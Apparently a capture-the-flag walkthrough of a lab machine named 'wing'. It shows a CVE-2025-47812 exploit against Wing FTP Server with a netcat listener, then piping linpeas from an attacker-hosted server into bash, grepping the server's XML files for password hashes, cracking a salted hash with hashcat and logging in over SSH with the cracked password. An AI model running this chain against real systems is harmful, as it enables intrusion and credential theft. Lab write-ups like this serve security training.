
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2

025/CVE-2025-47812.yaml
## Enumeration
### redirects
## Init foothold
### shell
First we get our ip


Get IP
```
ip a | grep tun
```
Start Listener
```
nc -lvnp 4444
```
edit and run go exploit for CVE-2025-47812
```
go run exploit/exploit.go
```
Should get
```
*] Injecting payload...
[*] Login response: 200
[*] UID cookie: 0020485c09350e31c211cdb4d328f652f528764d624db129b32c21fbca0cb8d6
[*] Triggering execution...

```
and Live shell
```
wingftp@wingdata:/$
```


### linpeas.sh

```
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000
```

**2. On the target, download and run it:**
```bash
curl http://10.10.xx.xx:8000/linpeas.sh | bash
```

```bash
╔══════════╣ Systemd Information
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
═╣ Systemd version and vulnerabilities? .............. 252.39
═╣ Services running as root? ..... 
═╣ Running services with dangerous capabilities? ... 
═╣ Services with writable paths? . wftpserver.service: /opt/wftpserver/wftpserver (from ExecStart=/opt/wftpserver/wftpserver)

```

## Info
	1. Users found root, wacky
```bash
find /opt/wftpserver/Data -name "*.xml" | xargs grep -i "password" 2>/dev/null
```
We find
```
/opt/wftpserver/Data/_ADMINISTRATOR/admins.xml:        <Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
/opt/wftpserver/Data/1/users/maria.xml:        <EnablePassword>1</EnablePassword>
/opt/wftpserver/Data/1/users/maria.xml:        <Password>a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03</Password>
/opt/wftpserver/Data/1/users/maria.xml:        <PasswordLength>0</PasswordLength>
/opt/wftpserver/Data/1/users/maria.xml:        <CanChangePassword>0</CanChangePassword>
/opt/wftpserver/Data/1/users/steve.xml:        <EnablePassword>1</EnablePassword>
/opt/wftpserver/Data/1/users/steve.xml:        <Password>5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca</Password>
/opt/wftpserver/Data/1/users/steve.xml:        <PasswordLength>0</PasswordLength>
/opt/wftpserver/Data/1/users/steve.xml:        <CanChangePassword>0</CanChangePassword>
/opt/wftpserver/Data/1/users/wacky.xml:        <EnablePassword>1</EnablePassword>
/opt/wftpserver/Data/1/users/wacky.xml:        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
/opt/wftpserver/Data/1/users/wacky.xml:        <PasswordLength>0</PasswordLength>
/opt/wftpserver/Data/1/users/wacky.xml:        <CanChangePassword>0</CanChangePassword>
/opt/wftpserver/Data/1/users/anonymous.xml:        <EnablePassword>0</EnablePassword>
/opt/wftpserver/Data/1/users/anonymous.xml:        <Password>d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca</Password>
/opt/wftpserver/Data/1/users/anonymous.xml:        <PasswordLength>0</PasswordLength>
/opt/wftpserver/Data/1/users/anonymous.xml:        <CanChangePassword>0</CanChangePassword>
/opt/wftpserver/Data/1/users/john.xml:        <EnablePassword>1</EnablePassword>
/opt/wftpserver/Data/1/users/john.xml:        <Password>c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10</Password>
/opt/wftpserver/Data/1/users/john.xml:        <PasswordLength>0</PasswordLength>
/opt/wftpserver/Data/1/users/john.xml:        <CanChangePassword>0</CanChangePassword>
/opt/wftpserver/Data/1/settings.xml:    <MYSQL_Password></MYSQL_Password>
/opt/wftpserver/Data/1/settings.xml:    <ODBC_DSN_Password></ODBC_DSN_Password>
/opt/wftpserver/Data/1/settings.xml:    <Min_Password_Length>0</Min_Password_Length>
/opt/wftpserver/Data/1/settings.xml:    <Password_Have_Numerals>0</Password_Have_Numerals>
/opt/wftpserver/Data/1/settings.xml:    <Password_Have_Lowercase>0</Password_Have_Lowercase>
/opt/wftpserver/Data/1/settings.xml:    <Password_Have_Uppercase>0</Password_Have_Uppercase>
/opt/wftpserver/Data/1/settings.xml:    <Password_Have_Nonalphanumeric>0</Password_Have_Nonalphanumeric>
/opt/wftpserver/Data/1/settings.xml:    <Change_Password_Firstlogon>0</Change_Password_Firstlogon>
/opt/wftpserver/Data/1/settings.xml:    <EnablePasswordSalting>1</EnablePasswordSalting>
/opt/wftpserver/Data/settings.xml:    <ServerPassword>2D35A8D420A697203D7C554A678F8119</ServerPassword>

```
in settings.xml we see password salting is enabled, the salt is WingFTP.
Lets try to crack the wacky password
```bash
hashcat -m 1410 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP /usr/share/wordlists/rockyou.txt --show
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5

```
```bash
Password is !#7Blushing^*Bride5
```
## User Cap
```bash
ssh wacky@wing.htb
wacky@wing.htb's password: !#7Blushing^*Bride5
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Feb 23 20:37:03 2026 from 10.10.16.18
wacky@wingdata:~$ ls
user.txt


```
## User Recon
```
sudo -l
```
shows an exposed backup python service which can be exploited